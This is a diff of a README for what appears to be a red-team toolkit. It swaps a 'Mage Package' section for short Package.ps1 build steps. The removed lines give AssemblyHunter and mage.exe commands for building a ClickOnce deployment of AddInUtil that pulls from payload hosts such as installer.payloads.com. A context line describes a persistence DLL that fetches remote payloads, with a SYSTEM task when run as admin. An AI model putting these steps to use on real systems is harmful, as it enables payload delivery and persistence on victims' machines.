@@ -45,36 +45,12 @@ Added matching on UPN and OST file, pulls hash from image if the expected OST fi
 Persister DLL, checks users permissions and creates a task, fetching a remote payload to an AppData directory. If admin, two tasks are created, one to run as SYSTEM. 
 
 ### Package.ps1
+Can collect built DLLs or build and collect to .\Package
 
-#### Mage Package
-Find a suitable .net host exe with AssemblyHunter
+```powershell
+.\Package.ps1
 
-```bat
-.\AssemblyHunter.exe path=C:\Users recurse=true clickonce=true signed=true
-```
-
-AddInUtil control (pops a window we can view console output on)
-
-```bat
-"C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\mage.exe" -New Application -Processor msil -ToFile AddInUtil.exe.manifest -name "AddInUtil" -Version 4.0.0.0 -FromDirectory .
-
-"C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\mage.exe" -New Deployment -Processor msil -Install false -ProviderUrl "https://payload.com/AddInUtil.application" -AppManifest AddInUtil.exe.manifest -ToFile AddInUtil.application
-
-# change addinutil.app from 1.0.0.0 to 4.0.0.0
-notepad AddInUtil.application
-```
-
-```bat
-set "MAGE_PATH=C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\mage.exe"
-set "EXE_NAME=AddInUtil"
-set "URL=https://installer.payloads.com/AddInUtil.application"
-
-%MAGE_PATH% -New Application -Processor msil -ToFile %EXE_NAME%.exe.manifest -name "%EXE_NAME%" -Version 4.0.0.0 -FromDirectory .
-%MAGE_PATH% -New Deployment -Processor msil -Install false -ProviderUrl %URL% -AppManifest %EXE_NAME%.exe.manifest -ToFile %EXE_NAME%.application
-```
-
-Script version
-```bat
-mage.bat AddInUtil https://installer.payloads.com/AddInUtil.application
+# build binaries as well
+.\Package.ps1 -build
 ```
 
